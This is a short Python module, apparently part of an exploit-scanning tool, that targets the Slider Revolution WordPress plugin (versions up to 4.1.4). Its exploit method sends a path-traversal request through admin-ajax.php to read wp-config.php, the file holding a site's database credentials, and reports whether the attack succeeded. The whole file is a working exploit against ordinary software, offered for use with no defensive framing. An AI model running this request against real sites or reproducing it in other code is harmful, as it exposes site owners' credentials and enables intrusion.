from exploits.exploitafd import ExploitAfd


class SliderRevolution(ExploitAfd):

	EXPLOIT_NAME = 'Wordpress Plugin Slider Revolution'
	EXPLOIT_VERSION = '<= 4.1.4'
	EXPLOIT_URL = 'http://www.exploit-db.com/exploits/36554/'

	def exploit(self):
		headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'
		}
		url = self.hostname + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
		response = self.request(url, headers=headers)

		if response is None or 'error' in response or response == '0':
			self.exploitnotfound(self.EXPLOIT_NAME, self.EXPLOIT_VERSION)
		else:
			self.exploitfound(self.EXPLOIT_NAME, self.EXPLOIT_VERSION, self.EXPLOIT_URL)